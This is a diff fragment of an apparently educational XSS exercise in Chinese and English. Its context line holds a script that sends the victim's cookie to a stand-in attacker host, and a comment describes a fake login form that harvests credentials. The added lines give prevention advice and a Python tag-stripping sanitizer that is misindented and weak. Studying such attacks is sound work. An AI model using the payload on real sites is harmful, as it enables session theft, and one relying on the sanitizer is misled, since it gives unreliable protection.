@@ -419,7 +419,16 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
     '</form>';
 ```
 ##### 這段腳本會修改頁面內容，顯示一個假的登入表單，當用戶輸入帳號密碼後，資料將發送到攻擊者的伺服器。
-3. Based on the scenario you did in the previous step, how could it be prevented?
+3. Based on the scenario you did in the previous step, how could it be prevented?  
+>`根據上述攻擊案例，開發者可以採取以下措施來防止 XSS 攻擊：`
+* 輸入驗證（Input Validation）
+  - 禁止輸入含有 HTML、JavaScript 代碼的內容，例如 <script>、onerror 等標籤。
+  - 使用正則表達式過濾不安全的輸入，例如：
+  ```python
+  import re
+  def sanitize_input(user_input):
+  return re.sub(r'<.*?>', '', user_input)
 
+  ```
 
 
